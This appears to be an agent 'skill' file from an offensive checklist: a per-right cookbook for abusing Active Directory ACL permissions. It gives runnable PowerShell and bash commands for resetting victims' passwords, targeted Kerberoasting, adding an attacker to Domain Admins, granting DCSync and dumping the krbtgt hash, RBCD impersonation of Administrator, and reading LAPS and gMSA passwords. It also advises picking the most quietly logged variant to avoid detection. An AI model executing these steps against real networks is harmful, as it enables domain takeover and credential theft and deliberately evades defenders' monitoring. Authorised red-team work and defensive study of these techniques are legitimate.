---
name: offensive-acl-abuse
description: "Active Directory ACL abuse methodology — exploiting object permissions like GenericAll, GenericWrite, WriteDacl, WriteOwner, AllExtendedRights, AddMember, WriteSPN, ForceChangePassword, and DCSync rights to escalate privileges within AD. Each ACL grants specific exploitation paths — this skill maps each right to its abuse primitive and provides BloodHound-driven path navigation. Use after BloodHound recon shows an attack path involving ACL grants on privileged objects."
---

# AD ACL Abuse

BloodHound surfaces attack paths through ACL grants. This skill is the per-right abuse cookbook.

## Quick Right → Abuse Map

| Right | Target | Abuse |
|---|---|---|
| `GenericAll` | Any user | Reset password, set SPN+kerberoast, force logon |
| `GenericAll` | Computer | RBCD via msDS-AllowedToActOnBehalfOfOtherIdentity |
| `GenericAll` | Group | Add yourself as member |
| `GenericAll` | Domain | DCSync via grant |
| `GenericWrite` | User | Set SPN, kerberoast, then revert |
| `WriteDacl` | Any | Grant yourself any further right (GenericAll) |
| `WriteOwner` | Any | Take ownership → grant GenericAll |
| `AllExtendedRights` (User) | User | Force password change |
| `AllExtendedRights` (Domain root) | Domain | DCSync |
| `AddMember` (Self / Modify) | Group | Add yourself as member |
| `WriteSPN` / `WriteProperty` | User | Targeted Kerberoast |
| `ForceChangePassword` | User | Set arbitrary password |
| `User-Force-Change-Password` | User | Same |
| `ReadLAPSPassword` | Computer | Read local admin password (LAPS) |
| `ReadGMSAPassword` | gMSA | Retrieve service account password |
| `Owns` | Any | Own → grant DACL |

## Primitives

### Reset User Password

```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# Then auth as victim
```

```bash
# Linux
nxc ldap dc -u attacker -p pass --pass-pol --user victim
# net rpc password
net rpc password 'victim' 'NewPass123!' -U 'attacker%pass' -S dc.corp.local
```

### Targeted Kerberoast (WriteSPN)

```powershell
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}
Rubeus.exe kerberoast /user:victim /nowrap
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

### Add Self to Group

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
```

### Grant DCSync via WriteDacl

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
  -PrincipalIdentity attacker -Rights DCSync
# Then DCSync krbtgt
```

```bash
impacket-secretsdump -just-dc-user 'corp/krbtgt' corp/attacker:pass@dc
```

### Take Ownership (WriteOwner → GenericAll)

```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
```

### RBCD Setup (GenericAll on Computer)

```bash
# impacket-rbcd
impacket-rbcd -delegate-to victim_computer$ -delegate-from attacker -action write \
  corp.local/attacker:pass

# Then S4U to act as any user
impacket-getST -spn cifs/victim.corp.local -impersonate Administrator \
  -dc-ip dc 'corp.local/attacker$:pass'
```

### Read LAPS Password

```powershell
Get-DomainObject -Identity computer | Select ms-Mcs-AdmPwd
# Or LAPSToolkit
Get-LAPSPasswords -Computer computer
```

```bash
nxc ldap dc -u attacker -p pass --laps   # if --laps reachable for that ACL
```

### Read gMSA Password

```bash
# Via DCSync if available; else gMSADumper
gMSADumper.py -u attacker -p pass -d corp.local -k computer$
```

## BloodHound Edge Reference

BloodHound's edge types map directly to these abuses:

- `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `AddMember`, `AllExtendedRights`, `WriteSPN`, `ForceChangePassword`, `ReadLAPSPassword`, `ReadGMSAPassword`, `Owns`, `DCSync`, `AddSelf`, `WriteAccountRestrictions`, `AddKeyCredentialLink`

Each edge in a BloodHound path corresponds to one abuse step. Walk the path, execute each.

## Detection

| Action | Defender View |
|---|---|
| Password reset on user | DC event 4724 |
| Group member add | DC event 4728 |
| ACL modification | DC event 4670 (object permissions changed) |
| DCSync from non-DC | MDI primary detection target |

For sensitive operations, prefer the most-quietly-logged variant (e.g., AddKeyCredentialLink for shadow credentials is quieter than direct password reset).

## Engagement Cheatsheet

```
[ ] BloodHound path identifies ACL grants
[ ] For each edge: select abuse primitive from this skill
[ ] Execute step, validate outcome before next step
[ ] Document each ACL → action → result
```

## Key References

- BloodHound docs: bloodhound.specterops.io
- "Abusing Active Directory ACLs/ACEs" (Robbins/Robbins/Schroeder)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/acl-abuse.md
